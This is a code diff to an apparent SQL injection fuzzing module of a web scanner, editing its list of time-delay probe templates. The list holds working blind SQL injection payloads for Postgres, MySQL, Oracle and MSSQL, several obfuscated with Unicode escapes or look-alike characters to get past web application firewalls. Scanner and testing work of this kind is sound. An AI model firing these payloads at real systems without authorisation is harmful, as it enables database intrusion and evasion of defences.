@@ -43,26 +43,20 @@ class sqli(BaseLightfuzz):
         "string not properly terminated",
     ]
 
-    # WAF-evasive time-delay payloads retain the default payloads' injection
-    # contexts while changing as little syntax as possible:
-    #   * Postgres uses a Unicode-escaped identifier for pg_sleep.
-    #   * MySQL accepts a # comment between SLEEP and its arguments; the
-    #     numeric form adds an empty string so it has the quoted token shape.
-    #   * Oracle folds the Unicode identifiers below to DBMS_PIPE and
-    #     RECEIVE_MESSAGE. The application schema needs EXECUTE on DBMS_PIPE.
-    #   * MSSQL assembles WAITFOR DELAY with compact string fragments. Keep the
-    #     plain WAITFOR forms as fallbacks because some request paths reject
-    #     dynamic batches even when stacked statements work.
+    # Each evasive delay probe is immediately followed by its plain fallback.
+    # The paired forms retain the same injection context and observable result.
     DELAY_PROBE_TEMPLATES = [
         '\'||U&"pg\\005fsleep"({d})--',
-        '\'OR(U&"pg\\005fsleep"({d})IS NULL)--',
-        "1'^SLEEP#q\n({d})^'0",
-        "'^SLEEP#q\n({d})^'0",
-        "^''^SLEEP#q\n({d})#",
+        "'||pg_sleep({d})--",
+        '\'OR(U&"pg\\005fsleep"({d})IS NOT NULL)FETCH FIRST 1 ROW ONLY-- -',
+        "' OR (SELECT TRUE FROM pg_sleep({d})) LIMIT 1-- -",
+        "1' AND (SLEEP({d})) AND '",
+        "' OR SLEEP({d}) IS NOT NULL LIMIT 1-- -",
+        " OR SLEEP({d}) IS NOT NULL LIMIT 1-- -",
         "'||DBMſ_PıPE.RECEıVE_MEſſAGE('a',{d})||'",
-        "';EXECUTE('W'+'AITFOR D'+'ELAY ''00:00:{d:02d}''')--",
+        "'||DBMS_PIPE.RECEIVE_MESSAGE('a',{d})||'",
+        "' AND (SELECT 1 FROM DUAL WHERE DBMS_LOCK.SLEEP({d})=0) AND '1'='1",
         "'; WAITFOR DELAY '00:00:{d:02d}'--",
-        ";EXECUTE('W'+'AITFOR D'+'ELAY ''00:00:{d:02d}''')--",
         "; WAITFOR DELAY '00:00:{d:02d}'--",
     ]
 
